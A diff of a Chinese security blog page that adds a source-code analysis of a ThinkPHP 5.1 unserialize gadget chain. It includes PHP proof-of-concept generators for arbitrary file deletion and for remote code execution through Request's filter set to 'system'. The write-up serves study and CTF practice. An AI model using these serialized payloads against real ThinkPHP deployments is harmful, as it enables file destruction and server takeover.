@@ -35,7 +35,7 @@
   mashiro_option.qzone_autocomplete = false;
   mashiro_option.site_name = "YukinoTroy3e";
   mashiro_option.author_name = "Troy3e";
-  mashiro_option.site_url = "https://sakura.hojun.cn";
+  mashiro_option.site_url = "https://troyess.com";
   mashiro_option.v_appId = "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz";
   mashiro_option.v_appKey = "h05kFRgBHS516pQ6vIsYtG1B";
   mashiro_option.mathjax = "0";
@@ -73,7 +73,7 @@
   <figure id="centerbg" class="centerbg">
     <div class="focusinfo no-select">
       <div class="header-tou">
-        <a href="https://sakura.hojun.cn">
+        <a href="https://troyess.com">
           <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png">
         </a>
       </div>
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-4-26<span class="bull">
+        2021-9-27<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,7 +215,7 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>复现一下ThinkPHP的各种漏洞，锻炼一下自己分析源码的能力，持续更新。<br>更新记录：<br>4/26<br>4/6<br>4/2<br>2021/3/28</p>
+          <p>复现一下ThinkPHP的各种漏洞，锻炼一下自己分析源码的能力，持续更新。<br>更新记录：<br>9/27<br>4/26<br>4/6<br>4/2<br>2021/3/28</p>
 <h2 id="ThinkPHP-5-0-x-lt-5-0-23-RCE分析-2021-3-28"><a href="#ThinkPHP-5-0-x-lt-5-0-23-RCE分析-2021-3-28" class="headerlink" title="ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析 2021/3/28"></a>ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析 2021/3/28</h2><p>首先查看官方log：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328215733.png" alt></p>
 <p>改进request的method方法，所以我们diffinity直接对比两个版本区别：</p>
@@ -420,6 +420,141 @@ namespace {
     echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
 }
 </code></pre><p>思路：<a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt</a><br>实战：[红明谷CTF 2021]EasyTP</p>
+<h2 id="Thinkphp5-1-反序列化分析-2021-9-25"><a href="#Thinkphp5-1-反序列化分析-2021-9-25" class="headerlink" title="Thinkphp5.1 反序列化分析 2021/9/25"></a>Thinkphp5.1 反序列化分析 2021/9/25</h2><p>2021/9/25</p>
+<p>首先必须要吐槽的是，因为自己太憨被tp的路由设置搞了一个多小时。<br>在application/index/controller下创建个新的控制器，并在route/route.php设置了路由</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210925220039.png" alt></p>
+<p>最开始直接访问的<a href="http://www.tp.com:xxx/unserialize，直接404，访问上面自带的think也是404，然而这时候没有意识到是访问路径的问题。。。以为问题出在了设置和nginx上，但是排查了一圈发现都没问题。最后才发现要这样访问：www.tp.com:xxx/index.php/unserialize" target="_blank" rel="noopener">www.tp.com:xxx/unserialize，直接404，访问上面自带的think也是404，然而这时候没有意识到是访问路径的问题。。。以为问题出在了设置和nginx上，但是排查了一圈发现都没问题。最后才发现要这样访问：www.tp.com:xxx/index.php/unserialize</a></p>
+<p>麻了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210925215726.png" alt></p>
+<p>这条链从/thinkphp/library/think/process/pipes/Windows.php的__destruct()方法入手。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926181426.png" alt></p>
+<p>close没用，关闭一个打开的文件指针。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926212152.png" alt></p>
+<p>此处file是可控的，所以这里存在一个任意文件删除的漏洞。</p>
+<p>POC:</p>
+<pre><code>&lt;?php
+
+namespace think\process\pipes;
+
+class Pipes
+{
+
+}
+
+class Windows extends Pipes
+{
+    private $files = [];
+    public function __construct(){
+        $this-&gt;files=[&#39;需要删除文件的路径&#39;];
+        }
+}
+
+echo base64_encode(serialize(new Windows()));
+</code></pre><p>file_exists函数会将filename当作字符串处理，这很容易联想到toString方法，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926215735.png" alt></p>
+<p>全局搜索toString，找到\thinkphp\library\think\model\concern\Conversion.php中Conversion类的toString方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926223351.png" alt></p>
+<p>跟进toJson</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926223940.png" alt></p>
+<p>options为256，跟进toArray</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927000425.png" alt></p>
+<p>首先要明确我们要找的是什么，$可控变量-&gt;方法(参数可控)，图中箭头所指满足这个条件。append可控，所以relation也可控。</p>
+<p>跟进getRelation方法看看有没有可利用的点：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927001024.png" alt></p>
+<p>key可控，所以name可控，可过第一个if。但是elseif里也无法利用。那么剩下的只有返回空。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927003247.png" alt></p>
+<p>满足if (!$relation)，跟进getAttr</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927003432.png" alt></p>
+<p>首先跟进getData看看：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927004120.png" alt></p>
+<p>还是无法利用，回到Conversiton.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927004150.png" alt></p>
+<p>反正relation是可控的，那就继续看看下面visible能不能利用，全局搜一波。</p>
+<p>插一条知识：自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。然后我们需要找到一个子类同时继承了Attribute类和Conversion类。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927150709.png" alt></p>
+<p>但是抽象类不能直接被实例化。<br>抽象类不能被直接实例化。抽象类中只定义（或部分实现）子类需要的方法。子类可以通过继承抽象类并通过实现抽象类中的所有抽象方法，使抽象类具体化。<br>如果子类需要实例化，前提是它实现了抽象类中的所有抽象方法。如果子类没有全部实现抽象类中的所有抽象方法，那么该子类也是一个抽象类，必须在 class 前面加上 abstract 关键字，并且不能被实例化。<br>所以全局搜extends Model，找到Pivot.php。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927154521.png" alt></p>
+<p>回到刚刚visible那里，全局搜下来没有可以直接利用的包含visible方法的类，所以转换思路找call。看看有没有和call_user_func和call_user_func_array一起的。</p>
+<p>public function __call($method, $args)<br>我们可以控制的是args，method为visible。</p>
+<p>排除掉参数不可控和参数可控但是是抽象函数的查询结果。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927160157.png" alt></p>
+<p>Request类的这个似乎可以用。<br>array_unshift — 在数组开头插入一个或多个单元。这就导致第一个参数不可控。<br>只能</p>
+<p>call_user_func_array([$obj,”任意方法”],[$this,任意参数])<br>也就是<br>$obj-&gt;$func($this,$argv)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927160859.png" alt></p>
+<p>这是很困难的。但是Thinkphp作为一个web框架,Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)<br>所以可以尝试覆盖filter的方法去执行代码<br>在/thinkphp/library/think/Request.php中找到了filterValue()方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927162108.png" alt></p>
+<p>此处value不可控，寻找能控制的点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927162436.png" alt></p>
+<p>其中filter为this-&gt;filter，所以不可控的只剩下回调函数的参数了，寻找调用input方法的地方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927162832.png" alt></p>
+<p>找到了param，看return $this-&gt;input($this-&gt;param, $name, $default, $filter);this-&gt;param是由本来的$this-&gt;param，还有请求参数和URL地址中的参数合并。所以把要执行的命令卸载get参数里即可。</p>
+<p>但是这里参数还是不可控。。。。继续找</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927163148.png" alt></p>
+<p>找到isAjax函数，config是可控的。所以param中name就是可控的</p>
+<p>为了看的更清楚些，画了个简图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/WD11ISLBESREHK%7DG2_LDKF2.jpg" alt></p>
+<p>POC：</p>
+<pre><code>&lt;?php
+namespace think\process\pipes{
+
+    use think\model\Pivot;
+
+    class Windows
+    {
+        private $files = [];
+        public function __construct(){
+            $this-&gt;files[]=new Pivot();
+        }
+    }
+}
+namespace think{
+    abstract class Model
+    {
+        protected $append = [];
+        private $data = [];
+        public function __construct(){
+            $this-&gt;data=array(
+              &#39;Troy3e&#39;=&gt;new Request()
+            );
+            $this-&gt;append=array(
+                &#39;Troy3e&#39;=&gt;array(
+                    &#39;Sakurajima&#39;=&gt;&#39;mai&#39;
+                )
+            );
+        }
+    }
+}
+namespace think\model{
+
+    use think\Model;
+
+    class Pivot extends Model
+    {
+
+    }
+}
+namespace think{
+    class Request
+    {
+        protected $hook = [];
+        protected $filter;
+        protected $config = [
+            &#39;var_pjax&#39;         =&gt; &#39;_ajax&#39;,
+        ];
+        public function __construct(){
+            $this-&gt;hook[&#39;visible&#39;]=[$this,&#39;isAjax&#39;];
+            $this-&gt;filter=&quot;system&quot;;
+        }
+    }
+}
+namespace{
+
+    use think\process\pipes\Windows;
+
+    echo base64_encode(serialize(new Windows()));
+}
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927211149.png" alt></p>
+<p>总结：这条链是tp第一条完全自己想了一遍的。难度确实比之前看的yii那些都高，不过收获很大。</p>
 
         </div>
         <!-- .entry-content -->
@@ -448,36 +583,19 @@ namespace {
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/04/27/红明谷CTF-2021-EasyTP/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143941.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1143941.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                [红明谷CTF 2021]EasyTP</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/04/20/护网杯-2018-easy-laravel/" rel="next">
+            <a href="/2021/09/21/Yii-unserialize/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141980.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141980.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1175334.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1175334.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                [护网杯 2018]easy_laravel</h3>
+                Yii unserialize</h3>
                 <hr>
               </div>
             </a>
